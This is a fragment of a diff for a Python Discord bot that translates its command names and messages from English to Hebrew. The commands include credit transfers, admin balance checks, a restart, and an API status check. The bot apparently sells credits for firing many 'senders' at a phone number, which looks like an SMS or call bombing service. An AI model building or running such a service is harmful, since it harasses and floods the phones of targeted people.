+    await interaction.followup.send(f"✅ נתת **{amount}** קרדיטים לכולם!", ephemeral=True)
 
-@tree.command(name="checkcredit", description="[ADMIN] Check balance of a specific user")
-@app_commands.describe(member="User to check")
+@tree.command(name="בדוקהקרדיט_אדמין", description="[ADMIN] בדוק יתרה של משתמש ספציפי")
+@app_commands.describe(member="משתמש לבדיקה")
 async def slash_checkcredit(interaction: discord.Interaction, member: discord.Member):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
     await interaction.response.defer(ephemeral=True)
     status = await get_balance_display(member.id)
-    embed = discord.Embed(title="💳 Wallet Info (Admin View)", color=0x2b2d31)
-    embed.add_field(name="User:", value=member.mention, inline=True)
-    embed.add_field(name="Current Balance:", value=f"**{status}**", inline=True)
-    embed.set_footer(text=f"Requested by {interaction.user.name}")
+    embed = discord.Embed(title="💳 מידע ארנק (תצוגת אדמין)", color=0x2b2d31)
+    embed.add_field(name="משתמש:", value=member.mention, inline=True)
+    embed.add_field(name="יתרה נוכחית:", value=f"**{status}**", inline=True)
+    embed.set_footer(text=f"נבדק על ידי {interaction.user.name}")
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="transfercredit", description="Transfer credits to another user (min 20)")
-@app_commands.describe(member="Recipient", amount="Amount to transfer (min 20)")
+@tree.command(name="העברתקרדיט", description="העבר קרדיטים למשתמש אחר (מינימום 20)")
+@app_commands.describe(member="מקבל", amount="כמות להעברה (מינימום 20)")
 async def slash_transfercredit(interaction: discord.Interaction, member: discord.Member, amount: int):
     await interaction.response.defer(ephemeral=True)
     if amount < 20:
-        await interaction.followup.send("❌ Minimum transfer is **20** credits.", ephemeral=True)
+        await interaction.followup.send("❌ מינימום העברה הוא **20** קרדיטים.", ephemeral=True)
         return
     if interaction.user.id == member.id:
-        await interaction.followup.send("❌ You can't transfer to yourself.", ephemeral=True)
+        await interaction.followup.send("❌ אי אפשר להעביר לעצמך.", ephemeral=True)
         return
     uid = interaction.user.id
     has_lt = await has_lifetime(uid)
     if has_lt:
-        await interaction.followup.send("❌ Lifetime users cannot transfer credits.", ephemeral=True)
+        await interaction.followup.send("❌ משתמשים ללא הגבלה לא יכולים להעביר קרדיטים.", ephemeral=True)
         return
     bal = await get_credits(uid)
     if bal < amount:
-        await interaction.followup.send(f"❌ Not enough credits. You have **{bal}**.", ephemeral=True)
+        await interaction.followup.send(f"❌ אין מספיק קרדיטים. יש לך **{bal}**.", ephemeral=True)
         return
     await remove_credits(uid, amount)
     await add_credits(member.id, amount)
-    embed = discord.Embed(title="💸 Transfer Complete", color=0x000000)
-    embed.add_field(name="From", value=interaction.user.mention, inline=True)
-    embed.add_field(name="To", value=member.mention, inline=True)
-    embed.add_field(name="Amount", value=f"**{amount}** credits", inline=True)
+    embed = discord.Embed(title="💸 העברה הושלמה", color=0x000000)
+    embed.add_field(name="מאת", value=interaction.user.mention, inline=True)
+    embed.add_field(name="אל", value=member.mention, inline=True)
+    embed.add_field(name="כמות", value=f"**{amount}** קרדיטים", inline=True)
     await interaction.followup.send(embed=embed, ephemeral=True)
 
-@tree.command(name="restart", description="[ADMIN] Restart the bot")
+@tree.command(name="הפעלמחדש", description="[ADMIN] הפעל מחדש את הבוט")
 async def slash_restart(interaction: discord.Interaction):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
-    await interaction.response.send_message("🔄 Restarting...", ephemeral=True)
+    await interaction.response.send_message("🔄 מפעיל מחדש...", ephemeral=True)
     await bot.close()
     os.execv(sys.executable, [sys.executable] + sys.argv)
 
-@tree.command(name="checkstatus", description="[ADMIN] Check how many APIs are working")
+@tree.command(name="בדוקAPI", description="[ADMIN] בדוק כמה APIs עובדים")
 async def slash_checkstatus(interaction: discord.Interaction):
     if not is_admin(interaction):
-        await interaction.response.send_message("❌ Admins only.", ephemeral=True)
+        await interaction.response.send_message("❌ רק אדמינים.", ephemeral=True)
         return
     
     await interaction.response.defer(ephemeral=True)
@@ -873,16 +874,16 @@ async def slash_checkstatus(interaction: discord.Interaction):
     success, failed = await fire_all_senders(test_phone)
     total = success + len(failed)
     
-    embed = discord.Embed(title="📊 API Status Check", color=RED)
-    embed.add_field(name="✅ Working", value=str(success), inline=True)
-    embed.add_field(name="❌ Failed", value=str(len(failed)), inline=True)
-    embed.add_field(name="🔢 Total Checked", value=str(total), inline=True)
+    embed = discord.Embed(title="📊 בדיקת סטטוס API", color=RED)
+    embed.add_field(name="✅ עובדים", value=str(success), inline=True)
+    embed.add_field(name="❌ נכשלו", value=str(len(failed)), inline=True)
+    embed.add_field(name="🔢 סה\"כ נבדקו", value=str(total), inline=True)
     
     if failed:
         failed_str = ", ".join(failed)
         if len(failed_str) > 1024:
             failed_str = failed_str[:1020] + "..."
-        embed.add_field(name="Failed APIs:", value=failed_str, inline=False)
+        embed.add_field(name="API שנכשלו:", value=failed_str, inline=False)
 
     await interaction.followup.send(embed=embed, ephemeral=True)
 
